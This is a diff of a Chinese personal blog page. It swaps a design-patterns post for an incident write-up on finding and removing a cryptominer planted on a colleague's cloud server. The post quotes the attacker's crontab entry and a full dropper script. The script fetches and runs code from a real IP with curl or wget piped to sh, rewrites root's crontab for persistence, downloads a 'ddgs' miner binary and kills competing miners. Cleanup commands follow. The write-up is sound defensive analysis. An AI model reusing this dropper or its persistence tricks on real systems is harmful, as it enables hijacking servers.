@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://landuo.github.io">
-  <title>设计模式介绍 | Accidia的记事本</title>
+  <title>记录一次被植入挖矿脚本并解决的过程 | Accidia的记事本</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="设计模式的类型 创建型模式（Creational Patterns） 结构型模式（Structural Patterns） 行为型模式（Behavioral Patterns）">
+  <meta name="description" content="前几天同事的阿里云CPU达到98%甚至100%的使用率, 然后向我寻求帮助, 经过一系列操作之后发现被植入挖矿脚本了(目测是服务器root密码设置简单被撞库了), 特地写下这篇文章记录下解决的过程. (由于解决的时候没有截图+该脚本的服务器被封禁了, 姑只能大致回忆下当时情形) 叨叨: 当我接手到他的电脑的时候觉得很神奇, 因为之前自己也有过被植入脚本挖矿导致 CPU 100%d的情况, 但我用的">
 <meta property="og:type" content="article">
-<meta property="og:title" content="设计模式介绍">
-<meta property="og:url" content="http://landuo.github.io/design-pattern/design-pattern-intro/index.html">
+<meta property="og:title" content="记录一次被植入挖矿脚本并解决的过程">
+<meta property="og:url" content="http://landuo.github.io/resolv_cpu100_by_mine_script/index.html">
 <meta property="og:site_name" content="Accidia的记事本">
-<meta property="og:description" content="设计模式的类型 创建型模式（Creational Patterns） 结构型模式（Structural Patterns） 行为型模式（Behavioral Patterns）">
+<meta property="og:description" content="前几天同事的阿里云CPU达到98%甚至100%的使用率, 然后向我寻求帮助, 经过一系列操作之后发现被植入挖矿脚本了(目测是服务器root密码设置简单被撞库了), 特地写下这篇文章记录下解决的过程. (由于解决的时候没有截图+该脚本的服务器被封禁了, 姑只能大致回忆下当时情形) 叨叨: 当我接手到他的电脑的时候觉得很神奇, 因为之前自己也有过被植入脚本挖矿导致 CPU 100%d的情况, 但我用的">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-08-17T12:44:18.000Z">
-<meta property="article:modified_time" content="2020-08-18T15:32:00.429Z">
+<meta property="article:published_time" content="2019-10-30T05:51:16.000Z">
+<meta property="article:modified_time" content="2020-08-23T13:58:02.568Z">
 <meta property="article:author" content="Accidia">
-<meta property="article:tag" content="设计模式">
+<meta property="article:tag" content="linux">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Accidia的记事本" type="application/atom+xml">
@@ -158,102 +158,61 @@ ga('send', 'pageview');
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-design-pattern/design-pattern-intro" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-resolv_cpu100_by_mine_script" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      设计模式介绍
+      记录一次被植入挖矿脚本并解决的过程
     </h1>
   
 
         
-        <a href="/design-pattern/design-pattern-intro/" class="archive-article-date">
-  	<time datetime="2020-08-17T12:44:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-17</time>
+        <a href="/resolv_cpu100_by_mine_script/" class="archive-article-date">
+  	<time datetime="2019-10-30T05:51:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-30</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="设计模式的类型"><a href="#设计模式的类型" class="headerlink" title="设计模式的类型"></a><strong>设计模式的类型</strong></h3><ul>
-<li>创建型模式（Creational Patterns）</li>
-<li>结构型模式（Structural Patterns）</li>
-<li>行为型模式（Behavioral Patterns）<a id="more"></a>
+        <p>前几天同事的阿里云CPU达到98%甚至100%的使用率, 然后向我寻求帮助, 经过一系列操作之后发现被植入挖矿脚本了(目测是服务器root密码设置简单被撞库了), 特地写下这篇文章记录下解决的过程. (由于解决的时候没有截图+该脚本的服务器被封禁了, 姑只能大致回忆下当时情形)</p>
+<p>叨叨: 当我接手到他的电脑的时候觉得很神奇, 因为之前自己也有过被植入脚本挖矿导致 CPU 100%d的情况, 但我用的VPS此时都已经是连不上的状态了, 但他的阿里云还能正常的连上ssh, 不知道是CPU没到100% 的缘故还是阿里做的优化的问题.  下面说下当初处理的步骤:  </p>
+<a id="more"></a>
 
+<ul>
+<li><p>使用 <code>top</code> 查看了下系统当前资源的利用率, 发现CPU在 98-99之间徘徊, CPU占用率最高的一个进程 <strong>COMMAND</strong> 叫做 <strong>Donald</strong>, 立马用 <code>find</code> 和 <code>whereis</code> 搜了一下, 结果没找到. 然后寻思着杀死这个进程, 后来同事说好像过段时间就会重新启动, 立马想到 linux 的定时任务 <strong>crontab</strong>.  </p>
+</li>
+<li><p>因为当时登录的是 <strong>root</strong> 用户, 所以用 <code>crontab -l</code> 查看了定时任务, 果真有这定时任务, 大喜 ! 执行命令得出的结果好像是这样的 :  </p>
 </li>
 </ul>
-<table class="reference notranslate">
-<tbody><tr><th style="width:5%;text-align: center;">序号</th><th style="width:45%;">模式 &amp; 描述</th><th>包括</th></tr>
-<tr><td style="text-align: center;">1</td><td><b>创建型模式</b><br>这些设计模式提供了一种在创建对象的同时隐藏创建逻辑的方式，而不是使用 new 运算符直接实例化对象。这使得程序在判断针对某个给定实例需要创建哪些对象时更加灵活。</td>
-<td>
-<ul>
-<li>工厂模式（Factory Pattern）</li>
-<li>抽象工厂模式（Abstract Factory Pattern）</li>
-<li>单例模式（Singleton Pattern）</li>
-<li>建造者模式（Builder Pattern）</li>
-<li>原型模式（Prototype Pattern）</li>
-</ul>
-</td>
-</tr>
-<tr><td style="text-align: center;">2</td><td><b>结构型模式</b><br>这些设计模式关注类和对象的组合。继承的概念被用来组合接口和定义组合对象获得新功能的方式。</td>
-<td>
-<ul>
-<li>适配器模式（Adapter Pattern）</li>
-<li>桥接模式（Bridge Pattern）</li>
-<li>过滤器模式（Filter、Criteria Pattern）</li>
-<li>组合模式（Composite Pattern）</li>
-<li>装饰器模式（Decorator Pattern）</li>
-<li>外观模式（Facade Pattern）</li>
-<li>享元模式（Flyweight Pattern）</li>
-<li>代理模式（Proxy Pattern）</li>
-</ul>
-</td>
-</tr>
-<tr><td style="text-align: center;">3</td><td><b>行为型模式</b><br>这些设计模式特别关注对象之间的通信。</td>
-<td>
-<ul>
-<li>责任链模式（Chain of Responsibility Pattern）</li>
-<li>命令模式（Command Pattern）</li>
-<li>解释器模式（Interpreter Pattern）</li>
-<li>迭代器模式（Iterator Pattern）</li>
-<li>中介者模式（Mediator Pattern）</li>
-<li>备忘录模式（Memento Pattern）</li>
-<li>观察者模式（Observer Pattern）</li>
-<li>状态模式（State Pattern）</li>
-<li>空对象模式（Null Object Pattern）</li>
-<li>策略模式（Strategy Pattern）</li>
-<li>模板模式（Template Pattern）</li>
-<li>访问者模式（Visitor Pattern）</li>
-</ul>
-</td>
-</tr>
-<tr><td style="text-align: center;">4</td><td><b>J2EE 模式</b><br>这些设计模式特别关注表示层。这些模式是由 Sun Java Center 鉴定的。</td>
-<td>
-<ul>
-<li>MVC 模式（MVC Pattern）</li>
-<li>业务代表模式（Business Delegate Pattern）</li>
-<li>组合实体模式（Composite Entity Pattern）</li>
-<li>数据访问对象模式（Data Access Object Pattern）</li>
-<li>前端控制器模式（Front Controller Pattern）</li>
-<li>拦截过滤器模式（Intercepting Filter Pattern）</li>
-<li>服务定位器模式（Service Locator Pattern）</li>
-<li>传输对象模式（Transfer Object Pattern）</li>
-</ul>
-</td>
-</tr>
-</tbody></table>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/15 * * * * (/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4||curl -fsSL -m180  http://103.219.112.66:8000/i.sh||wget -q -T180 -O- http://103.219.112.66:8000/i.sh) | sh</span><br></pre></td></tr></table></figure>
 
-<h3 id="设计模式的六大原则"><a href="#设计模式的六大原则" class="headerlink" title="设计模式的六大原则"></a><strong>设计模式的六大原则</strong></h3><ol>
-<li><strong>开闭原则（Open Close Principle）</strong><br>开闭原则的意思是：<strong>对扩展开放，对修改关闭</strong>。在程序需要进行拓展的时候，不能去修改原有的代码，实现一个热插拔的效果。简言之，是为了使程序的扩展性好，易于维护和升级。想要达到这样的效果，我们需要使用接口和抽象类，后面的具体设计中我们会提到这点。</li>
-<li><strong>里氏代换原则（Liskov Substitution Principle）</strong><br>里氏代换原则是面向对象设计的基本原则之一。 里氏代换原则中说，任何基类可以出现的地方，子类一定可以出现。LSP 是继承复用的基石，只有当派生类可以替换掉基类，且软件单位的功能不受到影响时，基类才能真正被复用，而派生类也能够在基类的基础上增加新的行为。里氏代换原则是对开闭原则的补充。实现开闭原则的关键步骤就是抽象化，而基类与子类的继承关系就是抽象化的具体实现，所以里氏代换原则是对实现抽象化的具体步骤的规范。</li>
-<li><strong>依赖倒转原则（Dependence Inversion Principle）</strong><br>这个原则是开闭原则的基础，具体内容：针对接口编程，依赖于抽象而不依赖于具体。</li>
-<li><strong>接口隔离原则（Interface Segregation Principle）</strong><br>这个原则的意思是：使用多个隔离的接口，比使用单个接口要好。它还有另外一个意思是：降低类之间的耦合度。由此可见，其实设计模式就是从大型软件架构出发、便于升级和维护的软件设计思想，它强调降低依赖，降低耦合。 </li>
-<li><strong>迪米特法则，又称最少知道原则（Demeter Principle）</strong><br>最少知道原则是指：一个实体应当尽量少地与其他实体之间发生相互作用，使得系统功能模块相对独立。  </li>
-<li><strong>合成复用原则（Composite Reuse Principle）</strong><br>合成复用原则是指：尽量使用合成/聚合的方式，而不是使用继承。</li>
-</ol>
+
+<ul>
+<li>接着顺腾摸瓜, 从定时任务里拿curl 那个命令去下载 i.sh 这个文件, 得到下面的内容的文件:  </li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin</span><br><span class="line"></span><br><span class="line">mkdir -p /var/spool/cron/crontabs</span><br><span class="line">echo "" &gt; /var/spool/cron/root</span><br><span class="line">echo "*/15 * * * * (/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4||curl -fsSL -m180  http://103.219.112.66:8000/i.sh||wget -q -T180 -O- http://103.219.112.66:8000/i.sh) | sh" &gt;&gt; /var/spool/cron/root</span><br><span class="line">cp -f /var/spool/cron/root /var/spool/cron/crontabs/root</span><br><span class="line"></span><br><span class="line">cd /tmp</span><br><span class="line">touch /usr/local/bin/writeable &amp;&amp; cd /usr/local/bin/</span><br><span class="line">touch /usr/libexec/writeable &amp;&amp; cd /usr/libexec/</span><br><span class="line">touch /usr/bin/writeable &amp;&amp; cd /usr/bin/</span><br><span class="line">rm -rf /usr/local/bin/writeable /usr/libexec/writeable /usr/bin/writeable</span><br><span class="line"></span><br><span class="line">export PATH=$PATH:$(pwd)</span><br><span class="line">ps auxf | grep -v grep | grep sequfa4 || rm -rf sequfa4</span><br><span class="line">if [ ! -f "sequfa4" ]; then</span><br><span class="line">    curl -fsSL -m1800 http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -o sequfa4||wget -q -T1800  http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -O sequfa4</span><br><span class="line">fi</span><br><span class="line">chmod +x sequfa4</span><br><span class="line">/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4</span><br><span class="line"></span><br><span class="line">ps auxf | grep -v grep | grep sequbcb | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequbcc | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequbcd | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequbce | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequfa0 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequfa1 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequfa2 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequfa3 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line"></span><br><span class="line">echo "*/15 * * * * (/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4||curl -m180 -fsSL  http://103.219.112.66:8000/i.sh||wget -q -T180 -O- http://103.219.112.66:8000/i.sh) | sh" | crontab -</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>分析这个文件可以知道, 该脚本在机子上运行了一个叫做 <strong>sequfa4</strong>, 拿到百度一搜这个名字, 嗯 ? 没啥结果 ? 接着仔细看完才晓得, 其实是在这一串代码中下载了一个本机架构的 <strong>ddgs</strong> 的文件 !  </li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if [ ! -f "sequfa4" ]; then</span><br><span class="line">    curl -fsSL -m1800 http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -o sequfa4||wget -q -T1800  http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -O sequfa4</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>搜索引擎一搜, 哦豁, 果真是挖矿脚本, 不过好在脚本所做的时候都已经知道了, 只要把此脚本做的事逆向回去就好了. </li>
+</ul>
+<pre><code class="shell">  #清除定时任务  
+  echo &quot;&quot; &gt; /var/spool/cron/root 
+  echo &quot;&quot; &gt; /var/spool/cron/crontabs/root
+
+  # 使用 rm 命令删除掉下载的 sequfa4 文件  
+  rm /usr/bin/sequfa4 /usr/libexec/sequfa4 /usr/local/bin/sequfa4 /tmp/sequfa4</code></pre>
+<ul>
+<li>接下来做的就是清除定时器里的任务和删掉下载的文件就好了, 但我发现删了并没有用, 然后试着重启之后就完全没有问题了. 用了早上大概一小时的时间发现问题并解决问题, 虽然实际解决很简单, 但发现的过程实在是很快乐. 吃一堑长一智, 估计下次他的密码应该会复杂一点点了.</li>
+</ul>
 
       
 
@@ -267,7 +226,7 @@ ga('send', 'pageview');
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">设计模式</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">linux</a>
         		</li>
       		
 		</ul>
@@ -279,7 +238,7 @@ ga('send', 'pageview');
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/Study//" class="article-tag-list-link color1">Study</a>
+        			<a href="/categories/Notes//" class="article-tag-list-link color1">Notes</a>
         		</li>
       		
 		</ul>
@@ -334,7 +293,7 @@ ga('send', 'pageview');
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://landuo.github.io/design-pattern/design-pattern-intro/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://landuo.github.io/resolv_cpu100_by_mine_script/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -348,18 +307,18 @@ ga('send', 'pageview');
   
 <nav id="article-nav">
   
-    <a href="/design-pattern/singleton/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/design_pattern_intro/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          单例模式
+          设计模式介绍
         
       </div>
     </a>
   
   
-    <a href="/resolv-cpu100-by-mine-script/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">记录一次被植入挖矿脚本并解决的过程</div>
+    <a href="/install_docker_with_raspberry_pi/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">树莓派安装docker</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -398,7 +357,7 @@ ga('send', 'pageview');
 <script src="//imsun.github.io/gitment/dist/gitment.browser.js"></script>
 <script>
 var gitment = new Gitment({
-  id: "http://landuo.github.io/design-pattern/design-pattern-intro/",
+  id: "http://landuo.github.io/resolv_cpu100_by_mine_script/",
   owner: 'landuo',
   repo: 'landuo.github.io',
   oauth: {
@@ -519,15 +478,15 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">树莓派</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">docker</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
               </li>
              
               <li class="article-tag-list-item">
